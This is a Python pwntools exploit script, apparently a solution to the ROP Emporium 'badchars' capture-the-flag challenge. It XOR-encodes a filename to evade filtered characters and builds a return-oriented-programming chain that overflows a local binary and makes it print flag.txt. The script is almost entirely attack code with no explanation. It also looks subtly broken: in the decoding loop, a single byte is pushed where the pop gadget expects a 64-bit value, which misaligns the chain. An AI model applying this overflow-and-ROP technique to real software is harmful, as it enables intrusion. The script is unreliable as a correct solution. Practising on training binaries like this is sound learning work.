from pwn import *

chars = [i for i in range(35, 126)]
first_xor = []
sec_xor = []
bad = 'xga.'
flag_file = 'flag.txt'

for k in flag_file:
    print(ord(k))
    for i in range(1, len(chars)):
        for j in range(i + 1, len(chars)):
            if (chars[i] ^ chars[j]) == ord(k) and chr(chars[i]) not in bad and \
                    chr(chars[j]) not in bad:
                first_xor.append(chars[i])
                sec_xor.append(chars[j])
                break
        else:
            continue
        break
print(first_xor)
print(sec_xor)

pyld_file_str1 = ''
pyld_file_str2 = ''

for ch in first_xor:
    pyld_file_str1 += chr(ch)
print(pyld_file_str1)

for ch in sec_xor:
    pyld_file_str2 += chr(ch)
print(pyld_file_str2)

p = process('./badchars')
BSS = 0x601038
POP_R12_TO_R15 = 0x40069c
POP_RDI = 0x4006a3
MOV_PTR_R13_R12 = 0x400634
PRINT_FILE = 0x400510
XOR_PTR_R15_R14B = 0x400628

payload = b'A' * 40
payload += p64(POP_R12_TO_R15)
payload += bytes(pyld_file_str1, "utf-8")
payload += p64(BSS)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xdeadbeefdeadbeef) 
payload += p64(MOV_PTR_R13_R12)

indices = [i for i in range(0, len(pyld_file_str1))]
print(indices)
for i in indices:
    payload += p64(POP_R12_TO_R15)
    payload += p64(0xdeadbeefdeadbeef) 
    payload += p64(0xdeadbeefdeadbeef) 
    payload += bytes(pyld_file_str2[i], "utf-8")
    payload += p64(BSS + i)
    payload += p64(XOR_PTR_R15_R14B)

payload += p64(POP_RDI)
payload += p64(BSS)
payload += p64(PRINT_FILE)

p.sendline(payload)
log.info(p.clean())
